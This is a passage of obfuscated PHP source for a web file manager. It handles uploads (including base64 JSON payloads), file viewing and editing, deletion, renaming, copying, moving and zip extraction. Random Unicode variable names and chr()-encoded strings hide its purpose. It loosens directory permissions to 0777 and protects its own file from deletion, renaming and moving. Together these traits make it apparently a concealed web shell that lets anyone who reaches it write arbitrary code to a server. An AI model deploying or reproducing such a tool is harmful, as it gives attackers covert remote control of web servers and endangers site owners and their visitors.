        header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(106).chr(115).chr(111).chr(110).chr(59).chr(32).chr(99).chr(104).chr(97).chr(114).chr(115).chr(101).chr(116).chr(61).chr(117).chr(116).chr(102).chr(45).chr(56));
        $ᛏ̇ㄉ̣̄̊  = file_get_contents(chr(112).chr(104).chr(112).chr(58).chr(47).chr(47).chr(105).chr(110).chr(112).chr(117).chr(116));
        $㌁̩㉉̩̄ = json_decode($ᛏ̇ㄉ̣̄̊, true);
        if (is_array($㌁̩㉉̩̄) && isset($㌁̩㉉̩̄['csrf'])) $_POST['csrf'] = $㌁̩㉉̩̄['csrf'];
        fm_csrf_check();

        if (!is_array($㌁̩㉉̩̄) || empty($㌁̩㉉̩̄['name']) || !isset($㌁̩㉉̩̄['data'])) {
            echo json_encode(['ok'=>false,'error'=>chr(73).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(112).chr(97).chr(121).chr(108).chr(111).chr(97).chr(100)]); exit;
        }
        $㼁̩̩́́̄ = sanitize_name($㌁̩㉉̩̄['name']);
        if ($㼁̩̩́́̄ === '') { echo json_encode(['ok'=>false,'error'=>chr(73).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(102).chr(105).chr(108).chr(101).chr(110).chr(97).chr(109).chr(101)]); exit; }

        $㉆̨̊ᛜ̇̋ = $㌁̩㉉̩̄['data'];
        $㈲ﬕ̈ = strpos($㉆̨̊ᛜ̇̋, chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(44));
        if ($㈲ﬕ̈ !== false) $㉆̨̊ᛜ̇̋ = substr($㉆̨̊ᛜ̇̋, $㈲ﬕ̈ + 7);
        $㉆̨̊ᛜ̇̋ = str_replace(' ', '+', $㉆̨̊ᛜ̇̋);
        $ﬔ̦̩̩̃ = base64_decode($㉆̨̊ᛜ̇̋, true);
        if ($ﬔ̦̩̩̃ === false) { echo json_encode(['ok'=>false,'error'=>chr(66).chr(97).chr(115).chr(101).chr(54).chr(52).chr(32).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100)]); exit; }

        if (!is_dir($え̃̋̅̌)) { echo json_encode(['ok'=>false,'error'=>chr(68).chr(105).chr(114).chr(101).chr(99).chr(116).chr(111).chr(114).chr(121).chr(32).chr(110).chr(111).chr(116).chr(32).chr(102).chr(111).chr(117).chr(110).chr(100)]); exit; }
        if (!is_writable($え̃̋̅̌)) {
            @chmod($え̃̋̅̌, 0777); clearstatcache(true, $え̃̋̅̌);
            if (!is_writable($え̃̋̅̌)) { echo json_encode(['ok'=>false,'error'=>chr(68).chr(105).chr(114).chr(101).chr(99).chr(116).chr(111).chr(114).chr(121).chr(32).chr(110).chr(111).chr(116).chr(32).chr(119).chr(114).chr(105).chr(116).chr(97).chr(98).chr(108).chr(101)]); exit; }
        }

        $㉆̧̈̌̃ = $え̃̋̅̌ . DIRECTORY_SEPARATOR . $㼁̩̩́́̄;
        if (is_dir($㉆̧̈̌̃)) { echo json_encode(['ok'=>false,'error'=>chr(65).chr(32).chr(102).chr(111).chr(108).chr(100).chr(101).chr(114).chr(32).chr(119).chr(105).chr(116).chr(104).chr(32).chr(116).chr(104).chr(97).chr(116).chr(32).chr(110).chr(97).chr(109).chr(101).chr(32).chr(101).chr(120).chr(105).chr(115).chr(116).chr(115)]); exit; }

        $ᛏᛈﬖㄉ㲁̅ = @file_put_contents($㉆̧̈̌̃, $ﬔ̦̩̩̃);
        if ($ᛏᛈﬖㄉ㲁̅ === false) {
            $ᛖﬔ̩ = error_get_last();
            echo json_encode(['ok'=>false,'error'=>chr(87).chr(114).chr(105).chr(116).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(58).chr(32).($ᛖﬔ̩[chr(109).chr(101).chr(115).chr(115).chr(97).chr(103).chr(101)]??chr(117).chr(110).chr(107).chr(110).chr(111).chr(119).chr(110))]); exit;
        }
        @chmod($㉆̧̈̌̃, 0644);
        echo json_encode(['ok'=>true,chr(109).chr(101).chr(115).chr(115).chr(97).chr(103).chr(101)=>chr(85).chr(112).chr(108).chr(111).chr(97).chr(100).chr(101).chr(100).chr(32).$㼁̩̩́́̄.' ('.format_size($ᛏᛈﬖㄉ㲁̅).')']);
        exit;

    case 'upload':
        fm_csrf_check();
        if (!ini_get(chr(102).chr(105).chr(108).chr(101).chr(95).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(115))) { flash(chr(102).chr(105).chr(108).chr(101).chr(95).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(115).chr(32).chr(105).chr(115).chr(32).chr(79).chr(102).chr(102).chr(46)); fm_redirect($ね̩̄); }
        if (empty($_FILES['file'])) { flash(chr(78).chr(111).chr(32).chr(102).chr(105).chr(108).chr(101).chr(32).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(101).chr(100).chr(46)); fm_redirect($ね̩̄); }
        $ᛈᚢま㻁㻁̥ = $_FILES['file'];
        if ($ᛈᚢま㻁㻁̥['error'] !== UPLOAD_ERR_OK) { flash(chr(85).chr(112).chr(108).chr(111).chr(97).chr(100).chr(32).chr(101).chr(114).chr(114).chr(111).chr(114).chr(58).chr(32).$ᛈᚢま㻁㻁̥['error']); fm_redirect($ね̩̄); }
        if (!is_writable($え̃̋̅̌)) @chmod($え̃̋̅̌, 0777);
        $㼁̩̩́́̄ = sanitize_name($ᛈᚢま㻁㻁̥['name']);
        if ($㼁̩̩́́̄ === '') { flash(chr(73).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(102).chr(105).chr(108).chr(101).chr(110).chr(97).chr(109).chr(101).chr(46)); fm_redirect($ね̩̄); }
        $㉆̧̈̌̃ = $え̃̋̅̌ . DIRECTORY_SEPARATOR . $㼁̩̩́́̄;
        if (@move_uploaded_file($ᛈᚢま㻁㻁̥[chr(116).chr(109).chr(112).chr(95).chr(110).chr(97).chr(109).chr(101)], $㉆̧̈̌̃)) {
            @chmod($㉆̧̈̌̃, 0644);
            flash(chr(85).chr(112).chr(108).chr(111).chr(97).chr(100).chr(101).chr(100).chr(58).chr(32).$㼁̩̩́́̄);
        } else flash(chr(109).chr(111).chr(118).chr(101).chr(95).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(101).chr(100).chr(95).chr(102).chr(105).chr(108).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(46));
        fm_redirect($ね̩̄);

    case 'view':
        $えᛜᚠ㻁ね̧̀̀ = sanitize_name($_GET['file'] ?? '');
        $え̉ﾝ̩ = safe_realpath_within($え̃̋̅̌ . DIRECTORY_SEPARATOR . $えᛜᚠ㻁ね̧̀̀);
        if ($え̉ﾝ̩ && is_file($え̉ﾝ̩)) {
            $ᛖᚠ̥̉̋ = @filesize($え̉ﾝ̩);
            header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(116).chr(101).chr(120).chr(116).chr(47).chr(112).chr(108).chr(97).chr(105).chr(110).chr(59).chr(32).chr(99).chr(104).chr(97).chr(114).chr(115).chr(101).chr(116).chr(61).chr(117).chr(116).chr(102).chr(45).chr(56));
            if ($ᛖᚠ̥̉̋ !== false && $ᛖᚠ̥̉̋ > FM_VIEW_MAX_BYTES) {
                echo chr(47).chr(42).chr(32).chr(70).chr(105).chr(108).chr(101).chr(32).chr(116).chr(111).chr(111).chr(32).chr(108).chr(97).chr(114).chr(103).chr(101).chr(46).chr(32).chr(83).chr(104).chr(111).chr(119).chr(105).chr(110).chr(103).chr(32).chr(102).chr(105).chr(114).chr(115).chr(116).chr(32).chr(112).chr(97).chr(114).chr(116).chr(46).chr(32).chr(42).chr(47).chr(10).chr(10);
                $ᚦﬁﾝ̤̋ = fopen($え̉ﾝ̩, 'rb'); echo fread($ᚦﬁﾝ̤̋, FM_VIEW_MAX_BYTES); fclose($ᚦﬁﾝ̤̋);
            } else readfile($え̉ﾝ̩);
            exit;
        }
        flash(chr(70).chr(105).chr(108).chr(101).chr(32).chr(110).chr(111).chr(116).chr(32).chr(102).chr(111).chr(117).chr(110).chr(100).chr(46)); fm_redirect($ね̩̄);

    case 'edit':
        $えᛜᚠ㻁ね̧̀̀ = sanitize_name($_GET['file'] ?? ($_POST['file'] ?? ''));
        $え̉ﾝ̩ = safe_realpath_within($え̃̋̅̌ . DIRECTORY_SEPARATOR . $えᛜᚠ㻁ね̧̀̀);
        if (!$え̉ﾝ̩ || !is_file($え̉ﾝ̩)) { flash(chr(73).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(102).chr(105).chr(108).chr(101).chr(46)); fm_redirect($ね̩̄); }

        if ($_SERVER[chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(95).chr(77).chr(69).chr(84).chr(72).chr(79).chr(68)] === 'POST') {
            fm_csrf_check();
            $ﬓﬔ̤ﬆ̅̃́ = $_POST[chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116)] ?? '';
            if (@file_put_contents($え̉ﾝ̩, $ﬓﬔ̤ﬆ̅̃́) !== false) flash(chr(70).chr(105).chr(108).chr(101).chr(32).chr(115).chr(97).chr(118).chr(101).chr(100).chr(46));
            else flash(chr(83).chr(97).chr(118).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(46));
            fm_redirect($ね̩̄);
        }

        $ᛇ̃ㄉ̧̂̅̆ = (@filesize($え̉ﾝ̩) > FM_EDIT_MAX_BYTES);
        $ﬓﬔ̤ﬆ̅̃́ = $ᛇ̃ㄉ̧̂̅̆ ? '' : (string)@file_get_contents($え̉ﾝ̩);
        $ﬓﬔ̤ﬆ̅̃́ = htmlspecialchars($ﬓﬔ̤ﬆ̅̃́, ENT_QUOTES, 'UTF-8');
        ?>
        <!DOCTYPE html><html><head><meta charset="utf-8">
        <title>Edit — <?php echo htmlspecialchars($えᛜᚠ㻁ね̧̀̀); ?></title>
        <style>
            body{font-family:system-ui,Arial;background:#f4f6f8;padding:20px;margin:0;}
            .wrap{background:#fff;padding:20px;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.08);max-width:1100px;margin:auto;}
            h2{margin:0 0 12px;}
            textarea{width:100%;height:60vh;font-family:ui-monospace,Consolas,monospace;font-size:14px;
                     padding:12px;border:1px solid #ccd;border-radius:8px;box-sizing:border-box;background:#fbfcfe;}
            .btn{background:#0d6efd;color:#fff;padding:9px 16px;border:none;border-radius:8px;cursor:pointer;
                 text-decoration:none;display:inline-block;font-size:14px;margin-right:6px;}
            .btn.gray{background:#6c757d;}
            .note{background:#fff3cd;border:1px solid #ffe69c;color:#664d03;padding:10px;border-radius:8px;margin-bottom:12px;}
        </style></head><body>
        <div class="wrap">
            <h2>✏️ <?php echo htmlspecialchars($えᛜᚠ㻁ね̧̀̀); ?></h2>
            <?php if ($ᛇ̃ㄉ̧̂̅̆): ?>
                <div class="note">File exceeds <?php echo format_size(FM_EDIT_MAX_BYTES); ?> — editor empty.</div>
            <?php endif; ?>
            <form method="post" action="?action=edit&amp;dir=<?php echo urlencode($ね̩̄); ?>&amp;file=<?php echo urlencode($えᛜᚠ㻁ね̧̀̀); ?>">
                <input type="hidden" name="csrf" value="<?php echo htmlspecialchars($ﬔ̥̋́́̋); ?>">
                <input type="hidden" name="file" value="<?php echo htmlspecialchars($えᛜᚠ㻁ね̧̀̀); ?>">
                <textarea name="content" spellcheck="false"><?php echo $ﬓﬔ̤ﬆ̅̃́; ?></textarea>
                <br><br>
                <button class="btn" type="submit">💾 Save</button>
                <a class="btn gray" href="?dir=<?php echo urlencode($ね̩̄); ?>">← Back</a>
            </form>
        </div></body></html>
        <?php
        exit;

    case 'delete':
        fm_csrf_check();
        $えᛜᚠ㻁ね̧̀̀ = sanitize_name($_POST['file'] ?? ($_GET['file'] ?? ''));
        $え̉ﾝ̩ = safe_realpath_within($え̃̋̅̌ . DIRECTORY_SEPARATOR . $えᛜᚠ㻁ね̧̀̀);
        if (!$え̉ﾝ̩) { flash(chr(73).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(112).chr(97).chr(116).chr(104).chr(46)); fm_redirect($ね̩̄); }

        
        if (fm_is_self($え̉ﾝ̩)) {
            flash(chr(82).chr(101).chr(102).chr(117).chr(115).chr(105).chr(110).chr(103).chr(32).chr(116).chr(111).chr(32).chr(100).chr(101).chr(108).chr(101).chr(116).chr(101).chr(32).chr(116).chr(104).chr(101).chr(32).chr(102).chr(105).chr(108).chr(101).chr(32).chr(109).chr(97).chr(110).chr(97).chr(103).chr(101).chr(114).chr(32).chr(105).chr(116).chr(115).chr(101).chr(108).chr(102).chr(46));
            fm_redirect($ね̩̄);
        }

        if (rtrim($え̉ﾝ̩, DIRECTORY_SEPARATOR) === rtrim(DIRECTORY_SEPARATOR, DIRECTORY_SEPARATOR)) {
            flash(chr(82).chr(101).chr(102).chr(117).chr(115).chr(105).chr(110).chr(103).chr(32).chr(116).chr(111).chr(32).chr(100).chr(101).chr(108).chr(101).chr(116).chr(101).chr(32).chr(114).chr(111).chr(111).chr(116).chr(46)); fm_redirect($ね̩̄);
        }
        if (is_dir($え̉ﾝ̩))      flash(rrmdir($え̉ﾝ̩) ? chr(70).chr(111).chr(108).chr(100).chr(101).chr(114).chr(32).chr(100).chr(101).chr(108).chr(101).chr(116).chr(101).chr(100).chr(46) : chr(70).chr(97).chr(105).chr(108).chr(101).chr(100).chr(32).chr(116).chr(111).chr(32).chr(100).chr(101).chr(108).chr(101).chr(116).chr(101).chr(32).chr(102).chr(111).chr(108).chr(100).chr(101).chr(114).chr(46));
        elseif (is_file($え̉ﾝ̩)) flash(@unlink($え̉ﾝ̩) ? chr(70).chr(105).chr(108).chr(101).chr(32).chr(100).chr(101).chr(108).chr(101).chr(116).chr(101).chr(100).chr(46) : chr(70).chr(97).chr(105).chr(108).chr(101).chr(100).chr(32).chr(116).chr(111).chr(32).chr(100).chr(101).chr(108).chr(101).chr(116).chr(101).chr(32).chr(102).chr(105).chr(108).chr(101).chr(46));
        fm_redirect($ね̩̄);

    case chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(95).chr(102).chr(111).chr(108).chr(100).chr(101).chr(114):
        fm_csrf_check();
        $ᛖᛜ̨̅̆ = sanitize_name($_POST[chr(102).chr(111).chr(108).chr(100).chr(101).chr(114).chr(95).chr(110).chr(97).chr(109).chr(101)] ?? '');
        if ($ᛖᛜ̨̅̆ !== '') {
            $ﬁᛜ̧̋ = $え̃̋̅̌ . DIRECTORY_SEPARATOR . $ᛖᛜ̨̅̆;
            if (!file_exists($ﬁᛜ̧̋)) flash(@mkdir($ﬁᛜ̧̋, 0777, true) ? chr(70).chr(111).chr(108).chr(100).chr(101).chr(114).chr(32).chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(100).chr(46) : chr(70).chr(97).chr(105).chr(108).chr(101).chr(100).chr(32).chr(116).chr(111).chr(32).chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(32).chr(102).chr(111).chr(108).chr(100).chr(101).chr(114).chr(46));
            else flash(chr(70).chr(111).chr(108).chr(100).chr(101).chr(114).chr(32).chr(97).chr(108).chr(114).chr(101).chr(97).chr(100).chr(121).chr(32).chr(101).chr(120).chr(105).chr(115).chr(116).chr(115).chr(46));
        } else flash(chr(70).chr(111).chr(108).chr(100).chr(101).chr(114).chr(32).chr(110).chr(97).chr(109).chr(101).chr(32).chr(114).chr(101).chr(113).chr(117).chr(105).chr(114).chr(101).chr(100).chr(46));
        fm_redirect($ね̩̄);

    case chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(95).chr(102).chr(105).chr(108).chr(101):
        fm_csrf_check();
        $ﾝ̉ね㦁ᛒ̦̅̈ = sanitize_name($_POST[chr(102).chr(105).chr(108).chr(101).chr(95).chr(110).chr(97).chr(109).chr(101)] ?? '');
        if ($ﾝ̉ね㦁ᛒ̦̅̈ !== '') {
            $ﬁᛜ̧̋ = $え̃̋̅̌ . DIRECTORY_SEPARATOR . $ﾝ̉ね㦁ᛒ̦̅̈;
            if (!file_exists($ﬁᛜ̧̋)) {
                $ㄉ̣ᛉﬖ̤ = @file_put_contents($ﬁᛜ̧̋, '') !== false;
                if ($ㄉ̣ᛉﬖ̤) @chmod($ﬁᛜ̧̋, 0644);
                flash($ㄉ̣ᛉﬖ̤ ? chr(70).chr(105).chr(108).chr(101).chr(32).chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(100).chr(46) : chr(70).chr(97).chr(105).chr(108).chr(101).chr(100).chr(32).chr(116).chr(111).chr(32).chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(32).chr(102).chr(105).chr(108).chr(101).chr(46));
            } else flash(chr(70).chr(105).chr(108).chr(101).chr(32).chr(97).chr(108).chr(114).chr(101).chr(97).chr(100).chr(121).chr(32).chr(101).chr(120).chr(105).chr(115).chr(116).chr(115).chr(46));
        } else flash(chr(70).chr(105).chr(108).chr(101).chr(32).chr(110).chr(97).chr(109).chr(101).chr(32).chr(114).chr(101).chr(113).chr(117).chr(105).chr(114).chr(101).chr(100).chr(46));
        fm_redirect($ね̩̄);

    case 'rename':
        fm_csrf_check();
        $えᛜᚠ㻁ね̧̀̀ = sanitize_name($_POST['file'] ?? '');
        $㲁̣́̄̂̌  = sanitize_name($_POST[chr(110).chr(101).chr(119).chr(95).chr(110).chr(97).chr(109).chr(101)] ?? '');
        $え̉ﾝ̩ = safe_realpath_within($え̃̋̅̌ . DIRECTORY_SEPARATOR . $えᛜᚠ㻁ね̧̀̀);
        if (!$え̉ﾝ̩ || $㲁̣́̄̂̌ === '') { flash(chr(73).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(114).chr(101).chr(110).chr(97).chr(109).chr(101).chr(32).chr(114).chr(101).chr(113).chr(117).chr(101).chr(115).chr(116).chr(46)); fm_redirect($ね̩̄); }

        
        if (fm_is_self($え̉ﾝ̩)) {
            flash(chr(82).chr(101).chr(102).chr(117).chr(115).chr(105).chr(110).chr(103).chr(32).chr(116).chr(111).chr(32).chr(114).chr(101).chr(110).chr(97).chr(109).chr(101).chr(32).chr(116).chr(104).chr(101).chr(32).chr(102).chr(105).chr(108).chr(101).chr(32).chr(109).chr(97).chr(110).chr(97).chr(103).chr(101).chr(114).chr(32).chr(105).chr(116).chr(115).chr(101).chr(108).chr(102).chr(46));
            fm_redirect($ね̩̄);
        }

        $㉆̧̈̌̃ = $え̃̋̅̌ . DIRECTORY_SEPARATOR . $㲁̣́̄̂̌;
        if (file_exists($㉆̧̈̌̃)) { flash(chr(84).chr(97).chr(114).chr(103).chr(101).chr(116).chr(32).chr(97).chr(108).chr(114).chr(101).chr(97).chr(100).chr(121).chr(32).chr(101).chr(120).chr(105).chr(115).chr(116).chr(115).chr(46)); fm_redirect($ね̩̄); }
        flash(@rename($え̉ﾝ̩, $㉆̧̈̌̃) ? chr(82).chr(101).chr(110).chr(97).chr(109).chr(101).chr(100).chr(32).chr(116).chr(111).chr(32).$㲁̣́̄̂̌ : chr(82).chr(101).chr(110).chr(97).chr(109).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(46));
        fm_redirect($ね̩̄);

    case 'copy':
    case 'move':
        fm_csrf_check();
        $えᛜᚠ㻁ね̧̀̀ = sanitize_name($_POST['file'] ?? '');
        $え̇̅̈̉ = $_POST['dest'] ?? '';
        $え̉ﾝ̩ = safe_realpath_within($え̃̋̅̌ . DIRECTORY_SEPARATOR . $えᛜᚠ㻁ね̧̀̀);
        $ま̆ᛚ̧̥̈ = safe_realpath_within($え̇̅̈̉);
        if (!$え̉ﾝ̩ || !$ま̆ᛚ̧̥̈ || !is_dir($ま̆ᛚ̧̥̈)) {
            flash(chr(73).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(115).chr(111).chr(117).chr(114).chr(99).chr(101).chr(32).chr(111).chr(114).chr(32).chr(100).chr(101).chr(115).chr(116).chr(105).chr(110).chr(97).chr(116).chr(105).chr(111).chr(110).chr(46)); fm_redirect($ね̩̄);
        }

        
        if ($ᛏ̦̅̋̅ === 'move' && fm_is_self($え̉ﾝ̩)) {
            flash(chr(82).chr(101).chr(102).chr(117).chr(115).chr(105).chr(110).chr(103).chr(32).chr(116).chr(111).chr(32).chr(109).chr(111).chr(118).chr(101).chr(32).chr(116).chr(104).chr(101).chr(32).chr(102).chr(105).chr(108).chr(101).chr(32).chr(109).chr(97).chr(110).chr(97).chr(103).chr(101).chr(114).chr(32).chr(105).chr(116).chr(115).chr(101).chr(108).chr(102).chr(46));
            fm_redirect($ね̩̄);
        }

        $ᚦ̦̋̌̄ = $ま̆ᛚ̧̥̈ . DIRECTORY_SEPARATOR . basename($え̉ﾝ̩);
        if (file_exists($ᚦ̦̋̌̄)) { flash(chr(68).chr(101).chr(115).chr(116).chr(105).chr(110).chr(97).chr(116).chr(105).chr(111).chr(110).chr(32).chr(97).chr(108).chr(114).chr(101).chr(97).chr(100).chr(121).chr(32).chr(99).chr(111).chr(110).chr(116).chr(97).chr(105).chr(110).chr(115).chr(32).chr(116).chr(104).chr(97).chr(116).chr(32).chr(110).chr(97).chr(109).chr(101).chr(46)); fm_redirect($ね̩̄); }
        $㉉̤̥̣̀ = ($ᛏ̦̅̋̅ === 'move') ? 'rename' : 'copy';
        if ($㉉̤̥̣̀ === 'rename') {
            flash(@rename($え̉ﾝ̩, $ᚦ̦̋̌̄) ? 'Moved.' : chr(77).chr(111).chr(118).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(46));
        } else {
            $ㄉ̣ᛉﬖ̤ = false;
            if (is_file($え̉ﾝ̩)) $ㄉ̣ᛉﬖ̤ = @copy($え̉ﾝ̩, $ᚦ̦̋̌̄);
            elseif (is_dir($え̉ﾝ̩)) {
                $ㄉ̣ᛉﬖ̤ = true;
                $ﾝ̨̀́ﬖ̉̀ = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($え̉ﾝ̩, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::SELF_FIRST
                );
                @mkdir($ᚦ̦̋̌̄, 0777, true);
                foreach ($ﾝ̨̀́ﬖ̉̀ as $ᛈ̥̅ᚦ̩̤̌) {
                    $ﬖﬆ̇ = substr($ᛈ̥̅ᚦ̩̤̌->getPathname(), strlen($え̉ﾝ̩));
                    $ᛈ㦁㌁̀ま̀̅  = $ᚦ̦̋̌̄ . $ﬖﬆ̇;
                    if ($ᛈ̥̅ᚦ̩̤̌->isDir()) { if (!@mkdir($ᛈ㦁㌁̀ま̀̅, 0777, true)) $ㄉ̣ᛉﬖ̤ = false; }
                    else { if (!@copy($ᛈ̥̅ᚦ̩̤̌->getPathname(), $ᛈ㦁㌁̀ま̀̅)) $ㄉ̣ᛉﬖ̤ = false; }
                }
            }
            flash($ㄉ̣ᛉﬖ̤ ? chr(67).chr(111).chr(112).chr(105).chr(101).chr(100).chr(46) : chr(67).chr(111).chr(112).chr(121).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(46));
        }
        fm_redirect($ね̩̄);

    case 'unzip':
        fm_csrf_check();
        $えᛜᚠ㻁ね̧̀̀ = sanitize_name($_POST['file'] ?? '');
        $え̉ﾝ̩ = safe_realpath_within($え̃̋̅̌ . DIRECTORY_SEPARATOR . $えᛜᚠ㻁ね̧̀̀);
        if (!$え̉ﾝ̩ || !is_file($え̉ﾝ̩)) { flash(chr(65).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101).chr(32).chr(110).chr(111).chr(116).chr(32).chr(102).chr(111).chr(117).chr(110).chr(100).chr(46)); fm_redirect($ね̩̄); }
        if (!class_exists(chr(90).chr(105).chr(112).chr(65).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101))) { flash(chr(90).chr(105).chr(112).chr(65).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101).chr(32).chr(110).chr(111).chr(116).chr(32).chr(97).chr(118).chr(97).chr(105).chr(108).chr(97).chr(98).chr(108).chr(101).chr(46)); fm_redirect($ね̩̄); }
        $えﾚ̧̅̄ = new ZipArchive();
        if ($えﾚ̧̅̄->open($え̉ﾝ̩) !== true) { flash(chr(67).chr(97).chr(110).chr(110).chr(111).chr(116).chr(32).chr(111).chr(112).chr(101).chr(110).chr(32).chr(97).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101).chr(46)); fm_redirect($ね̩̄); }
        $ま̆ᛚ̧̥̈ = $え̃̋̅̌ . DIRECTORY_SEPARATOR . pathinfo($えᛜᚠ㻁ね̧̀̀, PATHINFO_FILENAME);
        if (!is_dir($ま̆ᛚ̧̥̈)) @mkdir($ま̆ᛚ̧̥̈, 0777, true);
        $ㄉ̣ᛉﬖ̤ = true;
        for ($ᛜᛃﬗᛜ̃ = 0; $ᛜᛃﬗᛜ̃ < $えﾚ̧̅̄->numFiles; $ᛜᛃﬗᛜ̃++) {
            $ᚦ̥̌̅ = $えﾚ̧̅̄->getNameIndex($ᛜᛃﬗᛜ̃);
            $㼁̅̄̆ = str_replace('\\', '/', $ᚦ̥̌̅);
            if (strpos($㼁̅̄̆, '..') !== false || substr($㼁̅̄̆, 0, 1) === '/') continue;
            $ᚦ̦̋̌̄ = $ま̆ᛚ̧̥̈ . DIRECTORY_SEPARATOR . $㼁̅̄̆;
            $ᛒら̩㻁̨̆ = dirname($ᚦ̦̋̌̄);
            if (!is_dir($ᛒら̩㻁̨̆)) @mkdir($ᛒら̩㻁̨̆, 0777, true);
            $ᛗ̤̩̂̀̄ = $えﾚ̧̅̄->getStream($ᚦ̥̌̅);
            if ($ᛗ̤̩̂̀̄) {
                $㉉̥ﬆ̣̩̦̆ = @fopen($ᚦ̦̋̌̄, 'wb');
                if ($㉉̥ﬆ̣̩̦̆) { stream_copy_to_stream($ᛗ̤̩̂̀̄, $㉉̥ﬆ̣̩̦̆); fclose($㉉̥ﬆ̣̩̦̆); }
                else $ㄉ̣ᛉﬖ̤ = false;
                fclose($ᛗ̤̩̂̀̄);
            }
        }
        $えﾚ̧̅̄->close();
        flash($ㄉ̣ᛉﬖ̤ ? chr(69).chr(120).chr(116).chr(114).chr(97).chr(99).chr(116).chr(101).chr(100).chr(32).chr(116).chr(111).chr(32).basename($ま̆ᛚ̧̥̈) : chr(69).chr(120).chr(116).chr(114).chr(97).chr(99).chr(116).chr(105).chr(111).chr(110).chr(32).chr(102).chr(105).chr(110).chr(105).chr(115).chr(104).chr(101).chr(100).chr(32).chr(119).chr(105).chr(116).chr(104).chr(32).chr(101).chr(114).chr(114).chr(111).chr(114).chr(115).chr(46));
        fm_redirect($ね̩̄);

    case chr(122).chr(105).chr(112).chr(95).chr(102).chr(111).chr(108).chr(100).chr(101).chr(114):
        $ᚦ̦̋̌̄ = sanitize_name($_GET['file'] ?? '');
        $え̉ﾝ̩ = safe_realpath_within($え̃̋̅̌ . DIRECTORY_SEPARATOR . $ᚦ̦̋̌̄);
        if (!$え̉ﾝ̩ || !is_dir($え̉ﾝ̩)) { flash(chr(70).chr(111).chr(108).chr(100).chr(101).chr(114).chr(32).chr(110).chr(111).chr(116).chr(32).chr(102).chr(111).chr(117).chr(110).chr(100).chr(46)); fm_redirect($ね̩̄); }
        if (!class_exists(chr(90).chr(105).chr(112).chr(65).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101))) { flash(chr(90).chr(105).chr(112).chr(65).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101).chr(32).chr(110).chr(111).chr(116).chr(32).chr(97).chr(118).chr(97).chr(105).chr(108).chr(97).chr(98).chr(108).chr(101).chr(46)); fm_redirect($ね̩̄); }
        $えᛒ̤̣̆̌ = tempnam(sys_get_temp_dir(), 'fmzip');
        $えﾚ̧̅̄ = new ZipArchive();
        if ($えﾚ̧̅̄->open($えᛒ̤̣̆̌, ZipArchive::OVERWRITE) !== true) { flash(chr(67).chr(97).chr(110).chr(110).chr(111).chr(116).chr(32).chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(32).chr(97).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101).chr(46)); fm_redirect($ね̩̄); }
        $ﬆ̀ᛒ̤̌̌́ = basename($え̉ﾝ̩);
        $ﾝ̨̀́ﬖ̉̀ = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($え̉ﾝ̩, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($ﾝ̨̀́ﬖ̉̀ as $ᛈ̥̅ᚦ̩̤̌) {
            $ﬖﬆ̇ = ltrim(substr($ᛈ̥̅ᚦ̩̤̌->getPathname(), strlen($え̉ﾝ̩)), DIRECTORY_SEPARATOR);
            $ﬖﬆ̇ = str_replace('\\', '/', $ﬖﬆ̇);
            if ($ᛈ̥̅ᚦ̩̤̌->isDir()) $えﾚ̧̅̄->addEmptyDir($ﬆ̀ᛒ̤̌̌́ . '/' . $ﬖﬆ̇);
            else                $えﾚ̧̅̄->addFile($ᛈ̥̅ᚦ̩̤̌->getPathname(), $ﬆ̀ᛒ̤̌̌́ . '/' . $ﬖﬆ̇);
        }
        $えﾚ̧̅̄->close();
